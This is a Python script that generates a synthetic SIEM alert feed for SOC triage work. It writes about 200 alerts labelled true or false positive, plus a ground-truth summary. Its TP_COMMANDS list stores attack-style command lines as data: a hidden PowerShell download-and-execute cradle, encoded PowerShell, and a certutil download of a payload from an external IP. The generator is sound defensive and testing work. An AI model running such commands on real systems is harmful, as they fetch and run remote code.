"""
Phase 8.1 — Simulated SIEM alert feed generator.

Produces two artifacts:
  data/siem/alerts.jsonl       — ~200 alerts, one JSON object per line
  data/siem/ground_truth.json  — label distribution summary

Design:
  - 4 sources: edr, firewall, idp, cloud
  - 10 rule types across sources
  - ~15 correlated "incidents" (3-8 alerts sharing an entity within ~10 min)
  - ~40 standalone alerts
  - ~45% TRUE_POSITIVE / ~55% FALSE_POSITIVE — realistic SOC noise ratio
  - Deterministic: fixed random seed, reproducible

Run:
  python src/siem_generate_feed.py
"""
import json
import random
from collections import Counter
from datetime import datetime, timedelta, timezone
from pathlib import Path

SEED = 20260920
TARGET_ALERTS = 200
OUT_DIR = Path("data/siem")
OUT_ALERTS = OUT_DIR / "alerts.jsonl"
OUT_TRUTH = OUT_DIR / "ground_truth.json"

rng = random.Random(SEED)

# ---------------------------------------------------------------------------
# Rule catalog — (source, rule_id, rule_name, typical_severity, description)
# ---------------------------------------------------------------------------
RULES = [
    # EDR
    ("edr", "EDR-1042", "Suspicious PowerShell EncodedCommand", "HIGH",
     "Encoded PowerShell invocation, often used in fileless attacks (MITRE T1059.001)"),
    ("edr", "EDR-2001", "Office macro spawning child process", "HIGH",
     "A document macro launched a child process — frequent malware vector (T1204.002)"),
    ("edr", "EDR-3310", "Unsigned binary writing to system32", "MEDIUM",
     "Unsigned executable attempting to write to system directory"),
    ("edr", "EDR-4102", "Credential dumping tool signature", "CRITICAL",
     "Signature match for a credential dumping tool (e.g. Mimikatz-like)"),
    # Firewall
    ("firewall", "FW-0021", "Outbound connection to known C2 range", "HIGH",
     "Outbound traffic to an IP on the C2 threat intel list"),
    ("firewall", "FW-0044", "Port scan detected from internal host", "MEDIUM",
     "Internal host performing a horizontal port scan"),
    ("firewall", "FW-0102", "Large data transfer to external host", "MEDIUM",
     "Sustained outbound transfer exceeding baseline"),
    # Identity (IdP)
    ("idp", "IDP-0007", "Impossible travel login", "HIGH",
     "Two logins from geographically distant locations within an impossible window"),
    ("idp", "IDP-0011", "Multiple failed logins from single source", "MEDIUM",
     "Brute-force-style failed authentication pattern"),
    ("idp", "IDP-0020", "MFA disabled for privileged user", "CRITICAL",
     "MFA configuration change on a privileged account"),
    # Cloud
    ("cloud", "CLD-3001", "Root account access from new IP", "CRITICAL",
     "Cloud root account used from an IP not seen before"),
    ("cloud", "CLD-3010", "Public S3 bucket policy change", "HIGH",
     "S3 bucket policy modified to allow public read/write"),
    # LOW-severity noise — the "obviously suppress" tier
    ("edr", "EDR-9001", "Process enumeration by admin tool", "LOW",
     "Read-only process listing — routine admin / monitoring activity"),
    ("firewall", "FW-0099", "Internal SSH from management subnet", "LOW",
     "SSH from the known admin subnet — baseline operational access"),
    ("idp", "IDP-0099", "Successful login from new device", "LOW",
     "First login from a device not previously seen for this user"),
]

# ---------------------------------------------------------------------------
# Seed data — entities, plausible commands, external IPs
# ---------------------------------------------------------------------------
HOSTS = [f"ws-{n:04d}" for n in range(100, 180)]
SERVERS = [f"srv-{n:02d}" for n in range(1, 25)]
USERS = [
    "alice@acme.com", "bob@acme.com", "carol@acme.com", "dave@acme.com",
    "erin@acme.com", "frank@acme.com", "grace@acme.com", "heidi@acme.com",
    "ivan@acme.com", "judy@acme.com", "admin@acme.com", "svc-backup@acme.com",
    "svc-deploy@acme.com", "svc-monitor@acme.com",
]
INTERNAL_IPS = [f"10.20.{rng.randint(1,40)}.{rng.randint(2,250)}" for _ in range(60)]
EXTERNAL_IPS = [
    "203.0.113.42", "198.51.100.77", "192.0.2.15", "185.220.101.9",
    "45.142.212.61", "91.219.236.14", "193.32.162.44", "141.98.10.55",
    "5.188.206.18", "107.189.14.21",
]

# Commands for TP vs FP scenarios
TP_COMMANDS = [
    "powershell -enc SQBFAFgAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAA...",
    "powershell -nop -w hidden -c IEX(New-Object Net.WebClient).DownloadString(...)",
    "rundll32.exe C:\\Users\\Public\\tmp.dll,EntryPoint",
    "certutil -urlcache -f http://203.0.113.42/payload.bin payload.bin",
    "wmic process call create 'cmd.exe /c whoami /all > \\\\10.20.5.7\\share\\out.txt'",
]
FP_COMMANDS = [
    "powershell -Command Get-Process | Where-Object CPU -gt 100",
    "powershell -ExecutionPolicy Bypass -File C:\\Deploy\\deploy.ps1",
    "cmd.exe /c gpupdate /force",
    "schtasks /create /tn 'nightly-backup' /tr C:\\Scripts\\backup.bat /sc daily",
    "powershell -Command Invoke-WebRequest -Uri https://updates.acme.com/patch.msi",
]

PARENT_TP = ["winword.exe", "excel.exe", "outlook.exe", "wscript.exe"]
PARENT_FP = ["explorer.exe", "svchost.exe", "services.exe", "taskeng.exe"]

# ---------------------------------------------------------------------------
# Generation helpers
# ---------------------------------------------------------------------------
def iso(ts: datetime) -> str:
    return ts.replace(microsecond=0).isoformat().replace("+00:00", "Z")


def pick_entity(is_incident: bool, incident_host=None, incident_user=None):
    if is_incident and incident_host:
        host = incident_host
    else:
        host = rng.choice(HOSTS + SERVERS)
    if is_incident and incident_user:
        user = incident_user
    else:
        user = rng.choice(USERS)
    return {
        "host": host,
        "user": user,
        "src_ip": rng.choice(INTERNAL_IPS),
    }


def make_alert(alert_id: str, ts: datetime, rule_tuple, label: str, entity):
    source, rule_id, rule_name, severity, _desc = rule_tuple

    if label == "TRUE_POSITIVE":
        raw = {
            "process": rng.choice(["powershell.exe", "rundll32.exe", "wscript.exe", "certutil.exe", "cmd.exe"]),
            "command_line": rng.choice(TP_COMMANDS),
            "parent_process": rng.choice(PARENT_TP),
        }
        if source == "firewall":
            raw = {"dst_ip": rng.choice(EXTERNAL_IPS), "dst_port": rng.choice([443, 8080, 8443, 4444, 53])}
        elif source == "idp":
            raw = {"geo_a": "US", "geo_b": rng.choice(["RU", "CN", "BR", "IN"]), "minutes_between": rng.randint(2, 8)}
        elif source == "cloud":
            raw = {"principal": entity["user"], "region": rng.choice(["us-east-1", "eu-west-1", "ap-south-1"])}
    else:  # FALSE_POSITIVE
        raw = {
            "process": rng.choice(["powershell.exe", "cmd.exe", "schtasks.exe", "gpupdate.exe"]),
            "command_line": rng.choice(FP_COMMANDS),
            "parent_process": rng.choice(PARENT_FP),
        }
        if source == "firewall":
            raw = {"dst_ip": rng.choice(EXTERNAL_IPS), "dst_port": rng.choice([443, 80])}
        elif source == "idp":
            raw = {"geo_a": "US", "geo_b": "US", "minutes_between": rng.randint(30, 120)}
        elif source == "cloud":
            raw = {"principal": entity["user"], "region": "us-east-1"}

    return {
        "alert_id": alert_id,
        "timestamp": iso(ts),
        "source": source,
        "rule_id": rule_id,
        "rule_name": rule_name,
        "severity": severity,
        "entity": entity,
        "raw": raw,
        "labels": {
            "ground_truth": label,
        },
    }


# ---------------------------------------------------------------------------
# Main generation loop
# ---------------------------------------------------------------------------
def main():
    def _adjust_label_for_severity(rule_tuple, label):
        """LOW-severity rules are noise tier: bias strongly to FP."""
        _src, _rid, _name, sev, _desc = rule_tuple
        if sev == "LOW":
            return "FALSE_POSITIVE"
        return label

    OUT_DIR.mkdir(parents=True, exist_ok=True)

    alerts = []
    counter = 0
    base_time = datetime(2026, 9, 20, 8, 0, 0, tzinfo=timezone.utc)

    def next_id() -> str:
        nonlocal counter
        counter += 1
        return f"a-{counter:05d}"

    # ----- 1. Incident clusters (~15 incidents, 3-8 alerts each) -----
    n_incidents = 15
    for _ in range(n_incidents):
        is_true_incident = rng.random() < 0.75  # 75% of clusters are real
        incident_host = rng.choice(HOSTS)
        incident_user = rng.choice(USERS)
        cluster_size = rng.randint(3, 8)
        cluster_start = base_time + timedelta(minutes=rng.randint(0, 60 * 20))
        cluster_rules = rng.sample(RULES, k=min(cluster_size, len(RULES)))

        for i in range(cluster_size):
            rule = cluster_rules[i % len(cluster_rules)]
            ts = cluster_start + timedelta(minutes=rng.randint(0, 10), seconds=rng.randint(0, 59))
            label = "TRUE_POSITIVE" if is_true_incident else "FALSE_POSITIVE"
            entity = pick_entity(True, incident_host, incident_user)
            alerts.append(make_alert(next_id(), ts, rule, label, entity))

    # ----- 2. Standalone alerts (fill up to TARGET_ALERTS) -----
    # Severity-aware ground truth: high-severity alerts are presumed
    # real until ruled out; low-severity is presumed noise. This models
    # real SOC labeling, where a lone credential-dumping alert would
    # never be marked benign without context.
    SEVERITY_TP_PRIOR = {
        "CRITICAL": 0.90,
        "HIGH":     0.60,
        "MEDIUM":   0.25,
        "LOW":      0.00,
    }

    while len(alerts) < TARGET_ALERTS:
        rule = rng.choice(RULES)
        ts = base_time + timedelta(minutes=rng.randint(0, 60 * 24))
        sev = rule[3]  # severity from rule tuple
        p_tp = SEVERITY_TP_PRIOR.get(sev, 0.30)
        label = "TRUE_POSITIVE" if rng.random() < p_tp else "FALSE_POSITIVE"
        entity = pick_entity(False)
        alerts.append(make_alert(next_id(), ts, rule, label, entity))

    # Sort by timestamp for realism
    alerts.sort(key=lambda a: a["timestamp"])

    # Re-id after sort so IDs are monotonic in time
    for i, a in enumerate(alerts, start=1):
        a["alert_id"] = f"a-{i:05d}"

    # ----- 3. Write alerts.jsonl -----
    with OUT_ALERTS.open("w") as f:
        for a in alerts:
            f.write(json.dumps(a) + "\n")

    # ----- 4. Write ground_truth.json -----
    label_counts = Counter(a["labels"]["ground_truth"] for a in alerts)
    source_counts = Counter(a["source"] for a in alerts)
    severity_counts = Counter(a["severity"] for a in alerts)
    rule_counts = Counter(a["rule_id"] for a in alerts)

    truth = {
        "total_alerts": len(alerts),
        "label_distribution": dict(label_counts),
        "source_distribution": dict(source_counts),
        "severity_distribution": dict(severity_counts),
        "rule_distribution": dict(rule_counts),
        "true_positive_rate": round(label_counts["TRUE_POSITIVE"] / len(alerts), 4),
        "generated_with_seed": SEED,
    }

    OUT_TRUTH.write_text(json.dumps(truth, indent=2))

    # ----- 5. Print summary -----
    print(f"Wrote {OUT_ALERTS} ({len(alerts)} alerts)")
    print(f"Wrote {OUT_TRUTH}")
    print()
    print("Label distribution:")
    for k, v in sorted(label_counts.items()):
        print(f"  {k:<16} {v:>4}  ({v/len(alerts)*100:.1f}%)")
    print()
    print("Source distribution:")
    for k, v in sorted(source_counts.items()):
        print(f"  {k:<10} {v:>4}")
    print()
    print("Severity distribution:")
    for k in ["LOW", "MEDIUM", "HIGH", "CRITICAL"]:
        v = severity_counts.get(k, 0)
        print(f"  {k:<10} {v:>4}")


if __name__ == "__main__":
    main()
